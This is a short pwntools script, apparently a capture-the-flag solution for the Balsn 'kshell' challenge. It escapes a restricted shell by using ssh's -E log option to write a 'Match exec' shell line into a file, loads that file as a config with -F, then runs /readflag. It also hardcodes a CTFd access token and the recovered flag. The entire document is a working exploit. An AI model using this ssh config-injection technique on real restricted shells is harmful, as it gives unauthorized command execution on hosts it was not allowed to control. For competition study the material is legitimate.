from pwn import *
import secrets

TOKEN = b"ctfd_87f25a1626c103c0fcf8d4150f23003f318e0fa7010a7ed94bd157774a46bc53"
_, HOST, PORT = "nc kshell.balsnctf.com 7122".split()


with remote(HOST, PORT) as io:
    io.sendline(TOKEN)
    token = secrets.token_hex(16)
    io.sendlineafter(
        b"kshell~$",
        f"""
        ssh -E 'Match exec "sh 0<&2 1>&2" #{token}' x
        """.strip().encode(),
    )
    io.sendlineafter(
        b"kshell~$",
        f"""
        ssh -F 'Match exec "sh 0<&2 1>&2" #{token}' -E {token} x
        """.strip().encode(),
    )
    io.sendlineafter(
        b"kshell~$",
        f"""
        ssh -F {token} x
        """.strip().encode(),
    )
    io.sendline(b"/readflag")
    io.interactive()
    io.sendline(b"exit")

# PWNLIB_NOTERM=1 python solve.py
# BALSN{h0w_d1d_u_g3t_RCE_on_my_kSSHell??}